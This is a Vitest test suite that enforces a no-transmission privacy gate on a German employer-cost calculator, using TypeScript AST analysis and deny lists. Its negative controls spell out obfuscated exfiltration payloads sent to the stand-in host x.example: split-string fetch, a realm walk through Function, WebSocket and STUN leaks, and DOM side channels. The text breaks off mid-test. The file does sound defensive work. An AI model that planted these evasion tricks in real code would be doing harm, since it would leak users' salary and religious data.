import { describe, it, expect } from 'vitest';
import * as ts from 'typescript';
import fs from 'node:fs';
import path from 'node:path';

/**
 * §29 — the non-negotiable half.
 *
 * What gets typed into this calculator is a salary, a family situation, a
 * Bundesland, and whether the person belongs to a church. The last of those is
 * data about religious belief: special-category data under GDPR Article 9, and
 * the only reliable way to protect it is for it never to leave the browser.
 *
 * The rules and their shape are inherited from the Czech calculator's suite,
 * which was written after a reviewer got a working tracking pixel past 315
 * assertions by using `<img src>` — an attribute, not one of the transmission
 * APIs the sink list chased. The lesson was that enumerating sinks is the wrong
 * shape of rule, because the next sink is always the one nobody listed. So the
 * rule is inverted: this component needs no external origin at all, and any
 * absolute URL in it fails regardless of what would have carried it.
 *
 * Source assertions rather than runtime ones, deliberately: a runtime test
 * proves only the paths it happened to exercise, while reading the source
 * catches a `fetch` added to a branch no test reaches. That advantage is real
 * but conditional — it holds only while the source is read CORRECTLY, and for
 * one round it was not: a hand-written comment stripper blanked a live `fetch`
 * before any assertion saw it. Reading is now done with the TypeScript parser,
 * and the primary proof is structural rather than textual. The rules that match
 * names and substrings are kept below, marked as the defence in depth they are.
 */

const ROOT = path.join(__dirname, '..', '..', '..');
const read = (rel: string) => fs.readFileSync(path.join(ROOT, rel), 'utf8');

const BOUNDARY = 'components/DeEmployerCostCalculatorBoundary.tsx';
const COMPONENT = 'components/DeEmployerCostCalculator.tsx';
const ENGINE_DIR = 'lib/calculators/de-employer-cost';

const ENGINE_FILES = [
  'display-facts.ts',
  'unsupported-browser.ts',
  'engine.ts',
  'scope.ts',
  'validation.ts',
  'decimal.ts',
  'formatting.ts',
  'copy.ts',
  'types.ts',
  'unsupported.ts',
  'social/bvv.ts',
  'social/branches.ts',
  'tax/pap-2026.ts',
  'tax/church-tax.ts',
].map((f) => `${ENGINE_DIR}/${f}`);

const DATA_FILES = [
  'data/calculators/de-employer-cost/2026/rules.ts',
  'data/calculators/de-employer-cost/2026/sources.ts',
  'data/calculators/de-employer-cost/2026/pap/provenance.ts',
  'data/calculators/de-employer-cost/2026/pap/prueftabellen.ts',
  'data/calculators/de-employer-cost/types.ts',
];

/**
 * Everything the component can actually reach, followed transitively.
 *
 * The list used to be two hard-coded directories, which meant a leak in any NEW
 * module the component imports was never scanned at all — a literal `fetch()`
 * to an external host in `components/helper.ts` would have passed all 377
 * assertions. The set of files that matter is not a directory, it is the import
 * closure of the component, so that is what is computed.
 */
function importClosure(entry: string): string[] {
  const seen = new Set<string>();
  const queue = [entry];
  while (queue.length) {
    const rel = queue.shift()!;
    if (seen.has(rel)) continue;
    const abs = path.join(ROOT, rel);
    if (!fs.existsSync(abs)) continue;
    seen.add(rel);
    const src = fs.readFileSync(abs, 'utf8');
    for (const m of src.matchAll(/(?:from|import)\s*\(?\s*['"`]([^'"`]+)['"`]/g)) {
      const spec = m[1];
      if (!spec.startsWith('.')) continue; // node_modules and framework are not ours
      const resolvedBase = path.relative(ROOT, path.resolve(path.dirname(abs), spec));
      for (const cand of [
        resolvedBase,
        `${resolvedBase}.ts`,
        `${resolvedBase}.tsx`,
        `${resolvedBase}/index.ts`,
        `${resolvedBase}/index.tsx`,
      ]) {
        if (fs.existsSync(path.join(ROOT, cand)) && fs.statSync(path.join(ROOT, cand)).isFile()) {
          queue.push(cand);
          break;
        }
      }
    }
  }
  return [...seen];
}

// From the BOUNDARY, which is the entry point a route actually renders. The
// calculator is reached through its dynamic import, so the closure covers both
// and anything either of them grows.
const CLOSURE = Array.from(new Set([...importClosure(BOUNDARY), ...importClosure(COMPONENT)]));
const ALL = Array.from(new Set([BOUNDARY, COMPONENT, ...ENGINE_FILES, ...DATA_FILES, ...CLOSURE]));

/**
 * Strip comments so prose ABOUT `fetch` cannot fail a code assertion.
 *
 * DONE WITH THE TYPESCRIPT LEXER, not by hand, because the hand-written version
 * was defeated. It walked the source tracking quote characters, which is enough
 * for string literals and not enough for JavaScript. A REGULAR EXPRESSION whose
 * character class contains a slash and a star — `const SEP = /[/*]/`, legal ES
 * because an unescaped `/` is a permitted RegularExpressionClassChar — opened a
 * block comment as far as that walker was concerned, and it then blanked
 * everything up to the next comment terminator in the file. A reviewer put a
 * completely unobfuscated `fetch('https://x.example/leak?g=' + gross)` in the
 * gap and all 729 assertions passed, because no assertion ever saw the line.
 *
 * Comment removal is lexical, so it needs a lexer. The parser's own trivia is
 * the authority on what is a comment, and it settles regex-versus-division,
 * template substitution and JSX text at the same time.
 */
const parse = (file: string, src: string) =>
  ts.createSourceFile(file, src, ts.ScriptTarget.Latest, true, kindOf(file));

const kindOf = (file: string) => (file.endsWith('.tsx') ? ts.ScriptKind.TSX : ts.ScriptKind.TS);

function code(src: string, file = 'source.tsx'): string {
  const sf = parse(file, src);
  const out = src.split('');
  const blank = (from: number, to: number) => {
    for (let i = from; i < to && i < out.length; i++) if (out[i] !== '\n') out[i] = ' ';
  };
  // Every TOKEN, not every node: comments are trivia of the token that follows
  // them, and `forEachChild` skips punctuation and keywords — which is where a
  // file's own header comment lands. `getChildren` walks the real token stream.
  const visit = (n: ts.Node) => {
    const kids = n.getChildren(sf);
    if (kids.length === 0) {
      for (const r of ts.getLeadingCommentRanges(src, n.getFullStart()) ?? []) blank(r.pos, r.end);
      for (const r of ts.getTrailingCommentRanges(src, n.getEnd()) ?? []) blank(r.pos, r.end);
      return;
    }
    for (const k of kids) visit(k);
  };
  visit(sf);
  return out.join('');
}

/**
 * Strip string literals as well, for the assertions that are about what the
 * code DOES rather than what it references.
 *
 * The source registry's notes are English prose describing evidence, and one of
 * them contains the sentence "The one document that states every 2026 rate…".
 * A bare /\bdocument\b/ read that as the browser global and failed a purity
 * check on a file that has no code in it at all. The registry's whole job is to
 * talk about documents.
 *
 * Deliberately NOT applied to the component's URL assertions: there, a string
 * literal is exactly the thing being checked.
 */
const codeOnly = (src: string, file = 'source.ts') =>
  code(src, file)
    .replace(/'(?:[^'\\\n]|\\.)*'/g, "''")
    .replace(/"(?:[^"\\\n]|\\.)*"/g, '""')
    .replace(/`(?:[^`\\]|\\.)*`/g, '``');

/**
 * ═══════════════════════════════════════════════════════════════════════════
 * THE PRIMARY PROOF, AND IT IS STRUCTURAL. Everything below it is secondary.
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Five refutation rounds have now defeated the textual rules in this file, and
 * every defeat had the same shape. The rules match property NAMES and string
 * CONTENT, and both can be assembled at run time:
 *
 *   node['sty' + 'le']['setPro' + 'perty']('back' + 'ground-' + 'image', …)
 *   e.target.ownerDocument.title = gross + ':' + steuerklasse
 *   Function('return this')()['fe' + 'tch']('ht' + 'tps:' + '/' + '/x/' + net)
 *
 * None of those contains a forbidden substring. Adding `ownerDocument` to a
 * list would only move the boundary one identifier further out, which is the
 * game this file keeps losing.
 *
 * So the proof is inverted. Instead of asking whether the source contains
 * something bad, this asks whether the source is CONFINED TO A PINNED SURFACE,
 * and the pins are things a leak cannot avoid touching:
 *
 *   FREE IDENTIFIERS   every name the closure uses without declaring or
 *                      importing it. `fetch`, `document`, `window`,
 *                      `globalThis`, `navigator`, `WebSocket`, `Function` and
 *                      `eval` are all free identifiers, and none of them is on
 *                      the list. This is also where a new JSX tag lands, so
 *                      growing an <img>, <iframe> or <script> fails here.
 *
 *   FOREIGN PROPERTIES every property the closure reads or writes that it does
 *                      not itself declare. `ownerDocument`, `defaultView`,
 *                      `style`, `setProperty`, `setAttribute`, `innerHTML`,
 *                      `dataset` and `classList` are all foreign, and none is
 *                      on the list. Adding a field to the calculator's own
 *                      types is free; reaching for a platform API is not.
 *
 *   COMPUTED ACCESS    every `x[expr]` whose subscript is not a literal, pinned
 *                      by file and object expression. Every split-string bypass
 *                      above needs one, and each would be a site not on the
 *                      list. The legitimate ones are all locale and lookup
 *                      tables, which is why the list reads the way it does.
 *
 *   JSX SPREAD         zero, anywhere. A spread can carry a computed attribute
 *                      name past every attribute rule in this file.
 *
 *   CONSTRUCTORS       every `new X`, so a new channel object cannot appear.
 *
 * WHAT THIS DOES AND DOES NOT BUY, stated plainly because the last four
 * versions of this comment over-claimed and were caught doing it:
 *
 *   • It is not a proof that no sink exists. It is a proof that the closure's
 *     entire vocabulary is a fixed, reviewed list, so reaching ANY sink —
 *     listed or not, named directly or assembled — changes one of these sets
 *     and fails. That is a different and stronger claim than "no forbidden
 *     substring appears", and it is the one the earlier comments pretended to.
 *   • It does not resist an author who edits this file, and nothing can. The
 *     threat it is built against is a leak introduced into the calculator, not
 *     an adversary with commit rights over its own gate.
 *   • Scope resolution here is per-file and flat: a name declared anywhere in a
 *     file counts as declared everywhere in it. That over-approximates
 *     shadowing, and it is stated rather than assumed.
 *   • The pinned sets are meant to be inconvenient. A legitimate change that
 *     touches a new property or a new global SHOULD stop here and be read.
 *
 * The negative controls at the end of this block are not decoration: each one
 * is a leak that a previous round of reviewers actually got past this file, run
 * against the analyser to prove it now fails. A gate with no failing input is
 * not known to be a gate.
 */
type Structure = {
  free: string[];
  foreign: string[];
  computed: string[];
  spreads: string[];
  ctors: string[];
};

function structure(sources: ReadonlyMap<string, string>): Structure {
  const free = new Set<string>();
  const used = new Set<string>();
  const declared = new Set<string>();
  const computed = new Set<string>();
  const spreads: string[] = [];
  const ctors = new Set<string>();
  const nameOf = (n: ts.Node): string | null =>
    !n ? null : ts.isIdentifier(n) ? n.text : ts.isStringLiteral(n) ? n.text : null;

  for (const [rel, text] of sources) {
    const sf = parse(rel, text);

    // Everything this file binds: imports, variables, parameters, destructured
    // names, functions, classes and types. What is left over is free.
    const local = new Set<string>();
    const collect = (n: ts.Node) => {
      if ((ts.isImportSpecifier(n) || ts.isImportClause(n) || ts.isNamespaceImport(n)) && n.name) {
        local.add(n.name.text);
      }
      if (ts.isVariableDeclaration(n) || ts.isParameter(n) || ts.isBindingElement(n)) {
        const bind = (b: ts.Node) => {
          if (ts.isIdentifier(b)) local.add(b.text);
          else if (ts.isObjectBindingPattern(b) || ts.isArrayBindingPattern(b)) {
            for (const el of b.elements) if (!ts.isOmittedExpression(el) && el.name) bind(el.name);
          }
        };
        if (n.name) bind(n.name);
      }
      if ((ts.isFunctionDeclaration(n) || ts.isClassDeclaration(n)) && n.name) local.add(n.name.text);
      if (ts.isTypeAliasDeclaration(n) || ts.isInterfaceDeclaration(n) || ts.isEnumDeclaration(n)) {
        local.add(n.name.text);
      }
      ts.forEachChild(n, collect);
    };
    collect(sf);

    const walk = (n: ts.Node) => {
      if (ts.isPropertyAccessExpression(n)) used.add(n.name.text);
      if (ts.isElementAccessExpression(n)) {
        const arg = n.argumentExpression;
        if (ts.isStringLiteral(arg)) used.add(arg.text);
        else if (!ts.isNumericLiteral(arg)) computed.add(`${rel} :: ${n.expression.getText(sf)}`);
      }
      if (
        ts.isPropertySignature(n) || ts.isMethodSignature(n) || ts.isPropertyAssignment(n) ||
        ts.isShorthandPropertyAssignment(n) || ts.isPropertyDeclaration(n) ||
        ts.isMethodDeclaration(n) || ts.isGetAccessor(n) || ts.isEnumMember(n)
      ) {
        const name = nameOf(n.name);
        if (name) declared.add(name);
      }
      if (ts.isBindingElement(n)) {
        const name = nameOf(n.propertyName ?? n.name);
        if (name) declared.add(name);
      }
      if (ts.isNewExpression(n)) ctors.add(n.expression.getText(sf));
      if (ts.isJsxSpreadAttribute(n)) spreads.push(rel);
      if (ts.isIdentifier(n)) {
        const p = n.parent;
        const isName =
          (ts.isPropertyAccessExpression(p) && p.name === n) ||
          (ts.isPropertyAssignment(p) && p.name === n) ||
          (ts.isPropertySignature(p) && p.name === n) ||
          (ts.isMethodSignature(p) && p.name === n) ||
          (ts.isEnumMember(p) && p.name === n) ||
          (ts.isJsxAttribute(p) && p.name === n) ||
          (ts.isBindingElement(p) && p.propertyName === n) ||
          (ts.isQualifiedName(p) && p.right === n) ||
          ts.isImportSpecifier(p) ||
          ts.isExportSpecifier(p);
        if (!isName && !local.has(n.text)) free.add(n.text);
      }
      ts.forEachChild(n, walk);
    };
    walk(sf);
  }

  return {
    free: [...free].sort(),
    foreign: [...used].filter((p) => !declared.has(p)).sort(),
    computed: [...computed].sort(),
    spreads,
    ctors: [...ctors].sort(),
  };
}

/**
 * Every class the calculator renders, read off the JSX rather than guessed.
 *
 * This is what decides which CSS rules the stylesheet gate inspects, so it has
 * to come from the components themselves: a hand-written prefix is exactly how
 * 88 `pcalc` rules ended up outside the gate while the gate looked complete.
 */
function renderedClasses(): Set<string> {
  const out = new Set<string>();
  for (const [rel, text] of sourceMap()) {
    if (!rel.endsWith('.tsx')) continue;
    const sf = parse(rel, text);
    const visit = (n: ts.Node) => {
      if (
        ts.isJsxAttribute(n) &&
        n.name.getText(sf) === 'className' &&
        n.initializer &&
        ts.isStringLiteral(n.initializer)
      ) {
        for (const c of n.initializer.text.split(/\s+/)) if (c) out.add(c);
      }
      ts.forEachChild(n, visit);
    };
    visit(sf);
  }
  return out;
}

/**
 * Flatten the stylesheet to (selector, body) pairs, descending into at-rules.
 *
 * The previous splitter was `css.split('}')`, which reads `@media (max-width:
 * 480px) {` as a selector and so never inspected the first rule inside any
 * media block — and the calculator's narrow-viewport reflow lives in one.
 */
function cssRules(css: string): Array<{ selector: string; body: string }> {
  const out: Array<{ selector: string; body: string }> = [];
  const walk = (text: string) => {
    let depth = 0;
    let selectorStart = 0;
    let blockStart = 0;
    for (let i = 0; i < text.length; i++) {
      const c = text[i];
      if (c === '{') {
        if (depth === 0) blockStart = i;
        depth++;
      } else if (c === '}') {
        depth--;
        if (depth === 0) {
          const selector = text.slice(selectorStart, blockStart).trim();
          const body = text.slice(blockStart + 1, i);
          if (selector.startsWith('@') && /\{/.test(body)) walk(body);
          else if (!selector.startsWith('@')) out.push({ selector, body });
          selectorStart = i + 1;
        }
      }
    }
  };
  walk(css);
  return out;
}

/** The closure, resolved through the parser rather than a regex over the text. */
function astClosure(entries: string[]): string[] {
  const seen = new Set<string>();
  const queue = [...entries];
  while (queue.length) {
    const rel = queue.shift()!;
    if (seen.has(rel)) continue;
    const abs = path.join(ROOT, rel);
    if (!fs.existsSync(abs)) continue;
    seen.add(rel);
    const sf = parse(rel, fs.readFileSync(abs, 'utf8'));
    const visit = (n: ts.Node) => {
      const spec =
        (ts.isImportDeclaration(n) || ts.isExportDeclaration(n)) && n.moduleSpecifier
          ? n.moduleSpecifier
          : ts.isCallExpression(n) && n.expression.kind === ts.SyntaxKind.ImportKeyword
            ? n.arguments[0]
            : undefined;
      if (spec && ts.isStringLiteral(spec) && spec.text.startsWith('.')) {
        const base = path.resolve(path.dirname(abs), spec.text);
        for (const cand of [`${base}.ts`, `${base}.tsx`, `${base}/index.ts`, `${base}/index.tsx`, base]) {
          if (fs.existsSync(cand) && fs.statSync(cand).isFile()) {
            queue.push(path.relative(ROOT, cand));
            break;
          }
        }
      }
      ts.forEachChild(n, visit);
    };
    visit(sf);
  }
  return [...seen].sort();
}

const AST_CLOSURE = astClosure([BOUNDARY, COMPONENT]);
const sourceMap = () =>
  new Map(AST_CLOSURE.map((rel) => [rel, fs.readFileSync(path.join(ROOT, rel), 'utf8')] as const));

/** The reviewed vocabulary. Growth is deliberate friction, not an obstacle. */
const PINNED_FILES = new Set([
  'components/DeEmployerCostCalculator.tsx',
  'components/DeEmployerCostCalculatorBoundary.tsx',
  'data/calculators/de-employer-cost/2026/rules.ts',
  'data/calculators/de-employer-cost/2026/sources.ts',
  'data/calculators/de-employer-cost/types.ts',
  'lib/calculators/de-employer-cost/copy.ts',
  'lib/calculators/de-employer-cost/decimal.ts',
  'lib/calculators/de-employer-cost/display-facts.ts',
  'lib/calculators/de-employer-cost/engine.ts',
  'lib/calculators/de-employer-cost/formatting.ts',
  'lib/calculators/de-employer-cost/scope.ts',
  'lib/calculators/de-employer-cost/social/branches.ts',
  'lib/calculators/de-employer-cost/social/bvv.ts',
  'lib/calculators/de-employer-cost/tax/church-tax.ts',
  'lib/calculators/de-employer-cost/tax/pap-2026.ts',
  'lib/calculators/de-employer-cost/types.ts',
  'lib/calculators/de-employer-cost/unsupported-browser.ts',
  'lib/calculators/de-employer-cost/unsupported.ts',
  'lib/calculators/de-employer-cost/validation.ts',
]);

const FREE = new Set([
  'BigInt',
  'Error',
  'Intl',
  'Map',
  'Math',
  'Number',
  'ONE',
  'Object',
  'Parameters',
  'RangeError',
  'Readonly',
  'ReadonlyMap',
  'Record',
  'Set',
  'String',
  'T',
  'TypeError',
  'ZERO',
  'add',
  'align',
  'compareTo',
  'const',
  'dd',
  'details',
  'div',
  'divideExact',
  'divideScaled',
  'dl',
  'dt',
  'fieldset',
  'form',
  'h2',
  'h3',
  'isZero',
  'label',
  'legend',
  'li',
  'longValue',
  'multiply',
  'negate',
  'of',
  'option',
  'p',
  'section',
  'select',
  'setScale',
  'span',
  'strong',
  'subtract',
  'summary',
  'table',
  'tbody',
  'td',
  'th',
  'thead',
  'toNumber',
  'toString',
  'ul',
  'undefined',
]);

const FOREIGN = new Set([
  'MAX_SAFE_INTEGER',
  'NumberFormat',
  'call',
  'checked',
  'every',
  'filter',
  'find',
  'format',
  'get',
  'has',
  'hasOwnProperty',
  'includes',
  'isFinite',
  'isInteger',
  'join',
  'keys',
  'lastIndexOf',
  'length',
  'localeCompare',
  'map',
  'max',
  'min',
  'padEnd',
  'padStart',
  'preventDefault',
  'prototype',
  'push',
  'reduce',
  'replace',
  'slice',
  'sort',
  'split',
  'startsWith',
  'target',
  'test',
  'trim',
]);

const COMPUTED = new Set([
  'components/DeEmployerCostCalculator.tsx :: BUNDESLAND_NAMES',
  'components/DeEmployerCostCalculator.tsx :: BUNDESLAND_NAMES[a]',
  'components/DeEmployerCostCalculator.tsx :: BUNDESLAND_NAMES[b]',
  'components/DeEmployerCostCalculator.tsx :: ERROR_FIELD',
  'components/DeEmployerCostCalculator.tsx :: ERROR_TEXT',
  'components/DeEmployerCostCalculator.tsx :: ISSUE_FIELD',
  'components/DeEmployerCostCalculator.tsx :: ISSUE_TEXT',
  'components/DeEmployerCostCalculator.tsx :: NOTE_TEXT',
  'components/DeEmployerCostCalculator.tsx :: [\'I\', \'II\', \'III\', \'IV\', \'V\', \'VI\']',
  'components/DeEmployerCostCalculator.tsx :: c.label',
  'components/DeEmployerCostCalculatorBoundary.tsx :: CROSS_LINK_PATH',
  'components/DeEmployerCostCalculatorBoundary.tsx :: DISPLAY_BASIS.care',
  'components/DeEmployerCostCalculatorBoundary.tsx :: DISPLAY_BASIS.health',
  'components/DeEmployerCostCalculatorBoundary.tsx :: DISPLAY_BASIS.levies',
  'components/DeEmployerCostCalculatorBoundary.tsx :: DISPLAY_BASIS.pension',
  'components/DeEmployerCostCalculatorBoundary.tsx :: DISPLAY_BASIS.tax',
  'components/DeEmployerCostCalculatorBoundary.tsx :: DISPLAY_BASIS.unemployment',
  'components/DeEmployerCostCalculatorBoundary.tsx :: LANG',
  'components/DeEmployerCostCalculatorBoundary.tsx :: UNSUPPORTED_BROWSER',
  'lib/calculators/de-employer-cost/copy.ts :: copy',
  'lib/calculators/de-employer-cost/decimal.ts :: POW10',
  'lib/calculators/de-employer-cost/display-facts.ts :: LOCALE_TAG',
  'lib/calculators/de-employer-cost/engine.ts :: l',
  'lib/calculators/de-employer-cost/formatting.ts :: DECIMAL_SEPARATOR',
  'lib/calculators/de-employer-cost/formatting.ts :: LOCALE_TAG',
  'lib/calculators/de-employer-cost/tax/church-tax.ts :: CHURCH_TAX_RATE_PERCENT.value',
  'lib/calculators/de-employer-cost/tax/pap-2026.ts :: TAB1',
  'lib/calculators/de-employer-cost/tax/pap-2026.ts :: TAB2',
  'lib/calculators/de-employer-cost/tax/pap-2026.ts :: TAB3',
  'lib/calculators/de-employer-cost/tax/pap-2026.ts :: TAB4',
  'lib/calculators/de-employer-cost/tax/pap-2026.ts :: TAB5',
  'lib/calculators/de-employer-cost/tax/pap-2026.ts :: s',
]);

const CTORS = new Set(['Decimal', 'Error', 'Intl.NumberFormat', 'Map', 'RangeError', 'Set', 'TypeError']);

const violations = (s: Structure): string[] => [
  ...s.free.filter((x) => !FREE.has(x)).map((x) => `free identifier: ${x}`),
  ...s.foreign.filter((x) => !FOREIGN.has(x)).map((x) => `foreign property: ${x}`),
  ...s.computed.filter((x) => !COMPUTED.has(x)).map((x) => `computed access: ${x}`),
  ...s.spreads.map((x) => `JSX spread attribute: ${x}`),
  ...s.ctors.filter((x) => !CTORS.has(x)).map((x) => `constructor: new ${x}`),
];

describe('STRUCTURAL — the closure is confined to a reviewed vocabulary', () => {
  const STRUCTURE = structure(sourceMap());

  it('the parsed closure is the file set the rest of this suite scans', () => {
    // The textual closure walker below feeds every other rule in this file. If
    // the two disagree, one of them is scanning something the other is not, and
    // a gate that scans the wrong files is worse than no gate.
    expect(AST_CLOSURE.length, 'the closure is implausibly small').toBeGreaterThan(10);
    expect(AST_CLOSURE).toEqual([...PINNED_FILES].sort());
    for (const f of AST_CLOSURE) expect(CLOSURE, `${f} is scanned by the parser but not by the rules`).toContain(f);
  });

  it('reaches no global the platform could transmit, store or navigate through', () => {
    expect(STRUCTURE.free.filter((x) => !FREE.has(x))).toEqual([]);
    // Named explicitly so the intent survives a future edit to the list.
    for (const forbidden of [
      'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker',
      'RTCPeerConnection', 'BroadcastChannel', 'navigator', 'localStorage', 'sessionStorage',
      'indexedDB', 'document', 'window', 'globalThis', 'self', 'top', 'parent', 'location',
      'history', 'Function', 'eval', 'Image', 'FormData', 'URL', 'URLSearchParams',
    ]) {
      expect(FREE.has(forbidden), `${forbidden} is on the allowed list`).toBe(false);
    }
  });

  it('touches no property it does not itself declare', () => {
    expect(STRUCTURE.foreign.filter((x) => !FOREIGN.has(x))).toEqual([]);
    for (const forbidden of [
      'ownerDocument', 'defaultView', 'style', 'setProperty', 'setAttribute', 'innerHTML',
      'outerHTML', 'insertAdjacentHTML', 'classList', 'dataset', 'createElement', 'appendChild',
      'contentWindow', 'srcdoc', 'href', 'src', 'action', 'title', 'name', 'current',
      'currentTarget', 'postMessage', 'sendBeacon', 'setItem', 'open', 'submit', 'assign',
      'replaceState', 'pushState',
    ]) {
      expect(FOREIGN.has(forbidden), `${forbidden} is on the allowed list`).toBe(false);
    }
  });

  it('performs no computed member access outside the pinned lookup tables', () => {
    expect(STRUCTURE.computed.filter((x) => !COMPUTED.has(x))).toEqual([]);
  });

  it('spreads nothing into a JSX tag and constructs nothing unexpected', () => {
    expect(STRUCTURE.spreads).toEqual([]);
    expect(STRUCTURE.ctors.filter((x) => !CTORS.has(x))).toEqual([]);
  });

  it('the shipped tree is clean under all of the above at once', () => {
    expect(violations(STRUCTURE)).toEqual([]);
  });

  /**
   * NEGATIVE CONTROLS.
   *
   * Every entry is a leak that got past this file in an earlier round, replayed
   * against the analyser. `mutate` refuses to run if its anchor has moved, so
   * these cannot rot into assertions about a line that no longer exists.
   */
  const HANDLER = "onChange={(e) => set('gross')(e.target.value)}";
  const mutate = (replacement: string): Structure => {
    const sources = new Map(sourceMap());
    const src = sources.get(COMPONENT);
    expect(src.includes(HANDLER), 'the mutation anchor has moved').toBe(true);
    sources.set(COMPONENT, src.replace(HANDLER, replacement));
    return structure(sources);
  };

  const LEAKS: Array<[string, string]> = [
    [
      'an unobfuscated fetch, the leak the broken comment stripper hid',
      "onChange={(e) => { fetch('https://x.example/leak?g=' + e.target.value); set('gross')(e.target.value) }}",
    ],
    [
      'the split-literal background-image write, via e.target',
      "onChange={(e) => { const n = e.target; n['sty' + 'le']['setPro' + 'perty']('back' + 'ground-' + 'image', 'ur' + 'l(ht' + 'tps:' + '/' + '/x.example/' + n.value + ')'); set('gross')(n.value) }}",
    ],
    [
      'the same write with a same-origin payload, which no wire watcher catches',
      "onChange={(e) => { const n = e.target; n.style.backgroundImage = 'ur' + 'l(/r/' + n.value + ')'; set('gross')(n.value) }}",
    ],
    [
      'ambient state through ownerDocument, which issues no request at all',
      "onChange={(e) => { const n = e.target; n.ownerDocument.title = n.value + ':' + steuerklasse; set('gross')(n.value) }}",
    ],
    [
      'localStorage reached through defaultView',
      "onChange={(e) => { e.target.ownerDocument.defaultView['local' + 'Storage']['setItem']('g', e.target.value); set('gross')(e.target.value) }}",
    ],
    [
      'the realm walk that defeated the whole transmission blacklist',
      "onChange={(e) => { Function('return this')()['fe' + 'tch']('ht' + 'tps:' + '/' + '/x.example/' + e.target.value); set('gross')(e.target.value) }}",
    ],
    [
      'a WebSocket built from fragments',
      "onChange={(e) => { const g = e.target.ownerDocument.defaultView; new g['Web' + 'Socket']('ws' + 's:' + '/' + '/x.example/' + e.target.value); set('gross')(e.target.value) }}",
    ],
    [
      'the STUN leak, which the Playwright wire watcher cannot see',
      "onChange={(e) => { const g = e.target.ownerDocument.defaultView; new g.RTCPeerConnection({ iceServers: [{ urls: 'stu' + 'n:' + e.target.value + '.x.example' }] }); set('gross')(e.target.value) }}",
    ],
    [
      'an image element assembled at run time',
      "onChange={(e) => { const d = e.target.ownerDocument; const i = d['create' + 'Element']('img'); i['sr' + 'c'] = '/p?g=' + e.target.value; d.body['append' + 'Child'](i); set('gross')(e.target.value) }}",
    ],
    [
      'the JSX spread half of the CSS conspiracy',
      "onChange={(e) => set('gross')(e.target.value)} {...{ ['data-' + 'net']: String(outcome && outcome.supported ? outcome.employee.netCent : '') }}",
    ],
    [
      'window.name, reached without naming window',
      "onChange={(e) => { e.target.ownerDocument.defaultView.name = 'net=' + e.target.value; set('gross')(e.target.value) }}",
    ],
    [
      'a value encoded before it reaches a sink, so no rendered figure matches',
      "onChange={(e) => { e.target.ownerDocument.title = Number(e.target.value).toString(36); set('gross')(e.target.value) }}",
    ],
  ];

  for (const [label, leak] of LEAKS) {
    it(`rejects ${label}`, () => {
      const found = violations(mutate(leak));
      expect(found.length, `the analyser accepted: ${leak}`).toBeGreaterThan(0);
    });
  }

  it('the comment stripper no longer swallows code after a regex character class', () => {
    // The exact shape a reviewer used: `/[/*]/` is a legal regex whose class
    // contains a slash and a star. The hand-written walker treated it as a
    // block-comment opener and blanked everything up to the next terminator,
    // which is where the fetch below used to disappear.
    const src = [
      "const SEP = /[/*]/;",
      "fetch('https://x.example/leak?g=' + gross);",
      "const x = 1; /* narrow-viewport separator */",
    ].join('\n');
    const stripped = code(src, 'sample.ts');
    expect(stripped, 'the fetch was blanked by the stripper').toContain('fetch(');
    expect(stripped, 'the host was blanked by the stripper').toContain('x.example');
    expect(stripped, 'a real comment survived the stripper').not.toContain('narrow-viewport');
  });

  it('accepts a harmless edit, so the controls above are not passing on noise', () => {
    // Without this, a rule that failed on EVERYTHING would look like a working
    // gate. Renaming a local and reformatting the handler must stay clean.
    const clean = mutate("onChange={(ev) => { const next = ev.target.value; set('gross')(next) }}");
    expect(violations(clean)).toEqual([]);
  });
});

describe('every file exists — the list cannot silently stop covering things', () => {
  // A path that has been renamed makes its assertions vacuous rather than
  // failing, which is the quietest way for a privacy gate to stop working.
  for (const f of ALL) {
    it(`${f} is present`, () => {
      expect(fs.existsSync(path.join(ROOT, f)), f).toBe(true);
    });
  }

  it('scans every module the component can reach, however new', () => {
    // The hand-written lists are kept as a floor; the closure is the ceiling.
    // If the component grows a dependency in a directory nobody thought of,
    // this is what puts it under the rules rather than outside them.
    expect(CLOSURE.length, 'the import closure is implausibly small').toBeGreaterThan(5);
    expect(CLOSURE).toContain(COMPONENT);
    for (const f of ENGINE_FILES) {
      if (/copy|types|unsupported|decimal|formatting|scope|validation|engine|bvv|branches|pap-2026|church-tax/.test(f)) {
        expect(CLOSURE, `${f} is not reachable from the component`).toContain(f);
      }
    }
  });

  it('covers every non-test source file in the engine', () => {
    const found: string[] = [];
    const walk = (dir: string) => {
      for (const e of fs.readdirSync(path.join(ROOT, dir), { withFileTypes: true })) {
        const rel = `${dir}/${e.name}`;
        if (e.isDirectory()) walk(rel);
        else if (/\.tsx?$/.test(e.name) && !/\.test\.tsx?$/.test(e.name)) found.push(rel);
      }
    };
    walk(ENGINE_DIR);
    walk('data/calculators/de-employer-cost');
    // The reference interpreter is test-only and never reaches a page, so it is
    // the one exception — named explicitly rather than pattern-matched away.
    const covered = new Set([...ENGINE_FILES, ...DATA_FILES, `${ENGINE_DIR}/reference/pap-interpreter.ts`]);
    const uncovered = found.filter((f) => !covered.has(f));
    expect(uncovered, `not covered by the privacy gate:\n${uncovered.join('\n')}`).toEqual([]);
  });
});

describe('the calculator transmits nothing', () => {
  const FORBIDDEN: Array<[string, RegExp]> = [
    ['fetch', /\bfetch\s*\(/],
    ['XMLHttpRequest', /XMLHttpRequest/],
    ['sendBeacon', /sendBeacon/],
    ['WebSocket', /\bWebSocket\b/],
    ['EventSource', /\bEventSource\b/],
    ['axios', /\baxios\b/],
    ['gtag', /\bgtag\s*\(/],
    ['dataLayer', /dataLayer/],
    ['WebmasterID', /webmaster|wmid/i],
    ['localStorage', /localStorage/],
    ['sessionStorage', /sessionStorage/],
    ['IndexedDB', /indexedDB/i],
    ['document.cookie', /document\s*\.\s*cookie/],
    ['history writes', /pushState|replaceState/],
    ['location assignment', /location\s*\.\s*(href|search|hash|assign|replace)\s*=/],
    ['URLSearchParams', /URLSearchParams/],
    ['btoa / atob', /\b(btoa|atob)\s*\(/],
    ['form action', /\baction\s*=/],
    ['form method', /\bmethod\s*=/],
    ['postMessage', /postMessage/],
    ['BroadcastChannel', /BroadcastChannel/],
    ['Notification', /\bNotification\b/],
    ['navigator.sendBeacon / any navigator', /\bnavigator\b/],
  ];

  for (const file of ALL) {
    const src = code(read(file), file);
    for (const [label, re] of FORBIDDEN) {
      it(`${file} contains no ${label}`, () => {
        expect(re.test(src)).toBe(false);
      });
    }
  }
});

describe('the engine is pure', () => {
  it('reaches no browser global', () => {
    for (const file of [...ENGINE_FILES, ...DATA_FILES]) {
